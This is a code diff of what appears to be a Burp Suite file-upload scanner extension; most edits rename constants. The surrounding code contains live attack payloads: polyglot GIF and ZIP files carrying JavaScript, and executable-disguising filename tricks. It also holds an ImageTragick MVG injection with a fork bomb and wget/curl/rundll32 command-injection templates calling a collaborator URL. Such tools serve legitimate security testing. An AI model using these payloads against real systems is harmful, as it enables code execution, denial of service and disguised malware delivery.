@@ -3259,7 +3259,7 @@ trailer <<
             self._send_simple(injector, types, basename, content, redownload=True)
 
         if injector.opts.file_formats['gif'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PolyGifCsp"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "PolyGifCsp"
             content = 'R0lGODlhPSAnIKUkAAAAACgAAFkAAGRkZICAgI6OjpaWlpmZmaoAAKqqqrwAAL+/v8YAAMvLy8wAANQAANsAANsxMd7e3t8/P+JRUeNbW+Zqaufn5+h' \
                       '7e+uHh+uKiu2UlPGrq/KxsfS+vvTDw/fNzfnc3Prh4f39/f' + 111 * "/"
             content += 'yH+Jztkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgianNvdXRwdXQiKS5pbm5lckhUTUwgPSAiVGhpbmtGdSByZWNrb25zIENhamEgaXMgcmF0aGVyIG5' \
@@ -3278,7 +3278,7 @@ trailer <<
             content = content.decode("base64")
             types = {
                 # ('', self._marker_orig_ext, ''),
-                ('', BurpExtender.MARKER_ORIG_EXT, 'image/gif'),
+                ('', Constants.MARKER_ORIG_EXT, 'image/gif'),
                 ('', '.gif', ''),
                 ('', '.gif', 'image/gif'),
             }
@@ -3308,7 +3308,7 @@ trailer <<
             self._send_simple(injector, types, basename, content, redownload=True)
 
         # We always send this, as long as the polyglot module is activated, we assume the user wants this...
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "CorkamixPePdfJarHtml"
+        basename = Constants.DOWNLOAD_ME + self.FILE_START + "CorkamixPePdfJarHtml"
         content = 'eJytVF9PE0EQn4Ni4fgrUDXGhxVjWmLao0QjoccFKG2EUmxoYwykMdfe0i7e3TZ3C6FRnvwofgJN9MEHX/TJxFe/jIk6e1dsoeCTu9nb2Zm5385Mfjv' \
                   'FvZV0puUxVyTmstx7aRY3n5P9Vls0uVudm799v7SRT6ZTKq8d6rph+MKjpqPqTeHYxioAlHIA2wpcGAPKqNJFK+WqsHTOZxUi+I30aCKg17jVNnz08' \
                   'zq+gxdhO2O8Ry703f1/hsQd/od98tZScw/z+B0rKKvw483XyBfaE8oLJYRw/OO6JwCCCh+ENt0XbZsaMl3yihwzn9WYzUR7ucksi7qZU5JyzxtC2aY' \
@@ -3329,7 +3329,7 @@ trailer <<
         self._send_simple(injector, self.PDF_TYPES, basename, content, redownload=True)
 
         if injector.opts.file_formats['zip'].isSelected():
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "JsZip"
+            basename = Constants.DOWNLOAD_ME + self.FILE_START + "JsZip"
             content = "prompt(123);PK\x03\x04\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00" \
                       "empty.txtPK\x01\x02\x14\x03\x14\x00\x00\x00\x00\x00\xeb\x91[J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00" \
                       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00empty.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" \
@@ -3445,23 +3445,23 @@ trailer <<
         random_part = ''.join(random.sample(string.ascii_letters, 3))
 
         file_extension = FloydsHelpers.u2s(injector.get_default_file_ext())
-        semicolon_ie = BurpExtender.DOWNLOAD_ME + "Semicolon" + random_part+".exe;" + file_extension
+        semicolon_ie = Constants.DOWNLOAD_ME + "Semicolon" + random_part+".exe;" + file_extension
         title = "Semicolon in Content-Disposition"
         desc = 'Internet explorer might interprete a HTTP response header of Content-Disposition: attachment; filename="evil_file.exe;.txt" as an exe file. ' + \
-               "A filename of " + semicolon_ie + " was uploaded and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
+               "A filename of " + semicolon_ie + " was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
         self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=semicolon_ie))
-        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=BurpExtender.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3B" + file_extension))
-        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=BurpExtender.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3b" + file_extension))
+        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3B" + file_extension))
+        self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=Constants.DOWNLOAD_ME + "Semicolon"+random_part+".exe%3b" + file_extension))
         req = injector.get_request(semicolon_ie, orig_content)
         if req:
             self._make_http_request(injector, req, redownload_filename=semicolon_ie)
 
-        nulltruncate = BurpExtender.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe\x00" + file_extension
+        nulltruncate = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe\x00" + file_extension
         title = "Null byte filename truncate"
-        desc = 'A filename of ' + cgi.escape(nulltruncate) + " (including a truncating zero byte after .exe) was uploaded and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
+        desc = 'A filename of ' + cgi.escape(nulltruncate) + " (including a truncating zero byte after .exe) was uploaded and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
-        exp = BurpExtender.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe"
+        exp = Constants.DOWNLOAD_ME + "Nulltruncate" + random_part + ".exe"
         self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                              not_in_filename_content_disposition=file_extension))
         self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
@@ -3469,11 +3469,11 @@ trailer <<
         if req:
             self._make_http_request(injector, req, redownload_filename=exp)
 
-        backspace = BurpExtender.DOWNLOAD_ME + "Backspace" + random_part + ".exe" + file_extension + "\x08" * len(file_extension)
+        backspace = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe" + file_extension + "\x08" * len(file_extension)
         title = "Backspace filename truncate"
-        desc = "We uploaded a filename of " + backspace + " (having the 0x08 backspace character several time at the end) and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
+        desc = "We uploaded a filename of " + backspace + " (having the 0x08 backspace character several time at the end) and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
-        exp = BurpExtender.DOWNLOAD_ME + "Backspace" + random_part + ".exe"
+        exp = Constants.DOWNLOAD_ME + "Backspace" + random_part + ".exe"
         self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp,
                                              not_in_filename_content_disposition=file_extension))
         self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, not_in_url_content=file_extension, filecontent=orig_content))
@@ -3481,20 +3481,20 @@ trailer <<
         if req:
             self._make_http_request(injector, req, redownload_filename=exp)
 
-        left_to_right = BurpExtender.DOWNLOAD_ME + "\xe2\x80\xaeexe.thgirottfel" + random_part + file_extension
+        left_to_right = Constants.DOWNLOAD_ME + "\xe2\x80\xaeexe.thgirottfel" + random_part + file_extension
         random_part_reverse = random_part[::-1]
         title = "UTF-8 Unicode left to right overwrite"
         desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite " \
                "unicode char 0xE280AE) and detected that it's possible to download a file named {} . " \
-               "How such a file is presented to the user is dependent on the HTTP client.".format(left_to_right, BurpExtender.MARKER_URL_CONTENT)
+               "How such a file is presented to the user is dependent on the HTTP client.".format(left_to_right, Constants.MARKER_URL_CONTENT)
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
         expected_filenames = (
             left_to_right,
-            BurpExtender.DOWNLOAD_ME + file_extension[::-1] + random_part_reverse + "lefttoright" + ".exe",
-            BurpExtender.DOWNLOAD_ME + "%E2%80%AEexe.thgirottfel" + random_part + file_extension,
-            BurpExtender.DOWNLOAD_ME + "%e2%80%aeexe.thgirottfel" + random_part + file_extension,
-            BurpExtender.DOWNLOAD_ME + "%u202Eexe.thgirottfel" + random_part + file_extension,
-            BurpExtender.DOWNLOAD_ME + "%u202eexe.thgirottfel" + random_part + file_extension,
+            Constants.DOWNLOAD_ME + file_extension[::-1] + random_part_reverse + "lefttoright" + ".exe",
+            Constants.DOWNLOAD_ME + "%E2%80%AEexe.thgirottfel" + random_part + file_extension,
+            Constants.DOWNLOAD_ME + "%e2%80%aeexe.thgirottfel" + random_part + file_extension,
+            Constants.DOWNLOAD_ME + "%u202Eexe.thgirottfel" + random_part + file_extension,
+            Constants.DOWNLOAD_ME + "%u202eexe.thgirottfel" + random_part + file_extension,
         )
         for exp in expected_filenames:
             self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
@@ -3503,13 +3503,13 @@ trailer <<
         if req:
             self._make_http_request(injector, req, redownload_filename=left_to_right)
 
-        left_to_right2 = BurpExtender.DOWNLOAD_ME + "\xe2\x80\xae" + str(file_extension[::-1]) + "thgirottfel" + random_part + ".exe"
+        left_to_right2 = Constants.DOWNLOAD_ME + "\xe2\x80\xae" + str(file_extension[::-1]) + "thgirottfel" + random_part + ".exe"
         title = "UTF-8 Unicode left to right overwrite"
         desc = "We uploaded a filename of {} (which has the UTF-8 verison of left to right overwrite unicode char " \
                "0xE280AE) and detected that it's possible to download a file named {} . How such a file is presented " \
-               "to the user is dependent on the HTTP client.".format(left_to_right2, BurpExtender.MARKER_URL_CONTENT)
+               "to the user is dependent on the HTTP client.".format(left_to_right2, Constants.MARKER_URL_CONTENT)
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
-        expected_filenames = (left_to_right2, BurpExtender.DOWNLOAD_ME + "exe." + random_part_reverse + "lefttoright" + file_extension)
+        expected_filenames = (left_to_right2, Constants.DOWNLOAD_ME + "exe." + random_part_reverse + "lefttoright" + file_extension)
         for exp in expected_filenames:
             self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
             self.dl_matchers.add(DownloadMatcher(issue, url_content=exp, filecontent=orig_content))
@@ -3517,11 +3517,11 @@ trailer <<
         if req:
             self._make_http_request(injector, req, redownload_filename=left_to_right2)
 
-        rfc_2047 = BurpExtender.DOWNLOAD_ME + "=?utf-8?q?" + random_part + "Hi=21" + file_extension + "?="
+        rfc_2047 = Constants.DOWNLOAD_ME + "=?utf-8?q?" + random_part + "Hi=21" + file_extension + "?="
         title = "RFC 2047 in Content-Disposition"
-        desc = "A strange encoding found in RFC 2047. Recognized in some headers in Firefox and Chrome including Content-Disposition. We uploaded a filename of " + rfc_2047 + " and detected that it's possible to download a file named " + BurpExtender.MARKER_URL_CONTENT + " ."
+        desc = "A strange encoding found in RFC 2047. Recognized in some headers in Firefox and Chrome including Content-Disposition. We uploaded a filename of " + rfc_2047 + " and detected that it's possible to download a file named " + Constants.MARKER_URL_CONTENT + " ."
         issue = self._create_issue_template(base_request_response, title, desc, "Certain", "Low")
-        expected_filenames = (rfc_2047, BurpExtender.DOWNLOAD_ME + random_part + "Hi!" + file_extension)
+        expected_filenames = (rfc_2047, Constants.DOWNLOAD_ME + random_part + "Hi!" + file_extension)
         for exp in expected_filenames:
             self.dl_matchers.add(DownloadMatcher(issue, filename_content_disposition=exp))
         req = injector.get_request(rfc_2047, orig_content)
@@ -3614,7 +3614,7 @@ trailer <<
         name, ext = os.path.splitext(filename)
         orig_content = injector.get_uploaded_content()
         i = 0
-        for prot in BurpExtender.PROTOCOLS_HTTP:
+        for prot in Constants.PROTOCOLS_HTTP:
             if prot in orig_content:
                 for content, colab_url in self._generic_url_do_replace(burp_colab, prot, orig_content):
                     req = injector.get_request(name + str(i) + ext, content)
@@ -3689,7 +3689,7 @@ trailer <<
                 # Combine with replacer
                 if injector.opts.ru_combine_with_replacer and burp_colab:
                     i = 1
-                    for prot in BurpExtender.PROTOCOLS_HTTP:
+                    for prot in Constants.PROTOCOLS_HTTP:
                         if prot in content:
                             for content, colab_url in self._generic_url_do_replace(burp_colab, prot, content):
                                 new_filename = new_name + str(i) + new_ext
@@ -4112,7 +4112,7 @@ trailer <<
         if injector.opts.file_formats['mvg'].isSelected():
             content = "push graphic-context\n" \
                       "viewbox 0 0 " + str(injector.opts.image_width) + " " + str(injector.opts.image_height) + "\n" \
-                      "fill 'url(" + BurpExtender.MARKER_CACHE_DEFEAT_URL + "`:(){ :|:& };:`)'\npop graphic-context"
+                      "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "`:(){ :|:& };:`)'\npop graphic-context"
             new_title = title
             desc_fork_bomb = desc + "An ImageTragick CVE-2016-3714 injection with a fork bomb as a payload."
             attacks.append((orig_filename, content, '', new_title, desc_fork_bomb))
@@ -4157,10 +4157,10 @@ trailer <<
         # 1. When we have a Burp Collaborator configured as an IP (no DNS Collaborator) - autodetected in this extension
         # 2. When the server is not allowed to do DNS queries, but allowed to connect to a proxy that does DNS queries
         if burp_colab.is_ip_collaborator or injector.opts.wget_curl_payloads:
-            yield "Wget", "wget -O-", BurpExtender.MARKER_COLLAB_URL, None
-            yield "Curl", "curl", BurpExtender.MARKER_COLLAB_URL, None
-            yield "Rundll32", "rundll32 url.dll,FileProtocolHandler", BurpExtender.MARKER_COLLAB_URL, None
-            # yield "msiexec", "msiexec /a", BurpExtender.MARKER_COLLAB_URL, None
+            yield "Wget", "wget -O-", Constants.MARKER_COLLAB_URL, None
+            yield "Curl", "curl", Constants.MARKER_COLLAB_URL, None
+            yield "Rundll32", "rundll32 url.dll,FileProtocolHandler", Constants.MARKER_COLLAB_URL, None
+            # yield "msiexec", "msiexec /a", Constants.MARKER_COLLAB_URL, None
         else:
             yield "Nslookup", "nslookup", "test.example.org", "test.example.org"
 
@@ -4177,14 +4177,14 @@ trailer <<
         # Simply tries to send brr but as a GET request and to a different URL
         service = brr.getHttpService()
         iRequestInfo = self._helpers.analyzeRequest(brr)
-        new_req = "GET " + relative_url + " HTTP/1.1" + BurpExtender.NEWLINE
+        new_req = "GET " + relative_url + " HTTP/1.1" + Constants.NEWLINE
         headers = iRequestInfo.getHeaders()
         # very strange, Burp seems to include the status line in .getHeaders()...
         headers = headers[1:]
         new_headers = []
         for header in headers:
             is_bad_header = False
-            for bad_header in BurpExtender.REDL_URL_BAD_HEADERS:
+            for bad_header in Constants.REDL_URL_BAD_HEADERS:
                 if header.lower().startswith(bad_header):
                     is_bad_header = True
                     break
@@ -4193,9 +4193,9 @@ trailer <<
             new_headers.append(header)
         new_headers.append("Accept: */*")
 
-        new_headers = BurpExtender.NEWLINE.join(new_headers)
+        new_headers = Constants.NEWLINE.join(new_headers)
         new_req += new_headers
-        new_req += BurpExtender.NEWLINE * 2
+        new_req += Constants.NEWLINE * 2
 
         new_req = new_req.replace("${RANDOMIZE}", str(random.randint(100000000000, 999999999999)))
         attack = self._callbacks.makeHttpRequest(service, new_req)
@@ -4215,7 +4215,7 @@ trailer <<
             else:
                 number = ""
             sent_filename = prefix + basename + number + ext
-            new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
+            new_content = content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
             req = injector.get_request(sent_filename, new_content, content_type=mime_type)
             i += 1
             if req:
@@ -4233,7 +4233,7 @@ trailer <<
         i = 0
         for prefix, ext, mime_type in types:
             break_when_done = False
-            for prot in BurpExtender.PROTOCOLS_HTTP:
+            for prot in Constants.PROTOCOLS_HTTP:
                 colab_url = burp_colab.generate_payload(True)
                 if callable(replace):
                     # we got a function like object we need to call with the content and collaborator URL
@@ -4247,14 +4247,14 @@ trailer <<
                     already_found = []
                     for repl in replace:
                         if not repl:
-                            if BurpExtender.MARKER_COLLAB_URL not in content and \
-                            BurpExtender.MARKER_COLLAB_URL not in new_basename and \
-                            BurpExtender.MARKER_COLLAB_URL not in already_found:
+                            if Constants.MARKER_COLLAB_URL not in content and \
+                            Constants.MARKER_COLLAB_URL not in new_basename and \
+                            Constants.MARKER_COLLAB_URL not in already_found:
                                 print("Warning: Magic marker {} (looped) not found in content or filename of " \
-                                      "_send_collaborator:\n {} {}".format(BurpExtender.MARKER_COLLAB_URL, repr(content), repr(basename)))
-                            already_found.append(BurpExtender.MARKER_COLLAB_URL)
-                            new_content = new_content.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
-                            new_basename = new_basename.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
+                                      "_send_collaborator:\n {} {}".format(Constants.MARKER_COLLAB_URL, repr(content), repr(basename)))
+                            already_found.append(Constants.MARKER_COLLAB_URL)
+                            new_content = new_content.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
+                            new_basename = new_basename.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                         else:
                             if repl not in content and repl not in new_basename and repl not in already_found:
                                 print("Warning: Marker", repl, "not found in content or filename of _send_collaborator:\n", repr(content), repr(basename))
@@ -4273,17 +4273,17 @@ trailer <<
                     # We don't need the different prot here, so break the inner loop over the protocols once sent
                     break_when_done = True
                 else:
-                    # the default is we simply replace BurpExtender.MARKER_COLLAB_URL with a collaborator URL
-                    if BurpExtender.MARKER_COLLAB_URL not in content and BurpExtender.MARKER_COLLAB_URL not in basename:
+                    # the default is we simply replace Constants.MARKER_COLLAB_URL with a collaborator URL
+                    if Constants.MARKER_COLLAB_URL not in content and Constants.MARKER_COLLAB_URL not in basename:
                         print("Warning: Magic marker (default) {} not found in content or filename of " \
-                              "_send_collaborator:\n {} {}".format(BurpExtender.MARKER_COLLAB_URL, repr(content), repr(basename)))
-                    new_content = content.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
-                    new_basename = basename.replace(BurpExtender.MARKER_COLLAB_URL, prot + colab_url + "/")
+                              "_send_collaborator:\n {} {}".format(Constants.MARKER_COLLAB_URL, repr(content), repr(basename)))
+                    new_content = content.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
+                    new_basename = basename.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                 if randomize:
                     number = str(i) + ''.join(random.sample(string.ascii_letters, 3))
                 else:
                     number = ""
-                new_content = new_content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
+                new_content = new_content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                 filename = prefix + new_basename + number + ext
                 req = injector.get_request(filename, new_content, content_type=mime_type)
                 i += 1
@@ -4310,7 +4310,7 @@ trailer <<
                 number = ""
             filename = prefix + basename + number + ext
             expected_filename = self._filename_to_expected(filename)
-            new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
+            new_content = content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
             req = injector.get_request(filename, new_content, content_type=mime_type)
             i += 1
             if req:
@@ -4331,7 +4331,7 @@ trailer <<
                     filename = prefix + basename + number + ext
                     expected_filename = self._filename_to_expected(filename)
                     # A feature to prevent caching of responses to identical requests
-                    new_content = content.replace(BurpExtender.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
+                    new_content = content.replace(Constants.MARKER_CACHE_DEFEAT_URL, "https://example.org/" + ''.join(random.sample(string.ascii_letters, 11)) + "/")
                     req = injector.get_request(filename, new_content, content_type=mime_type)
                     i += 1
                     if req:
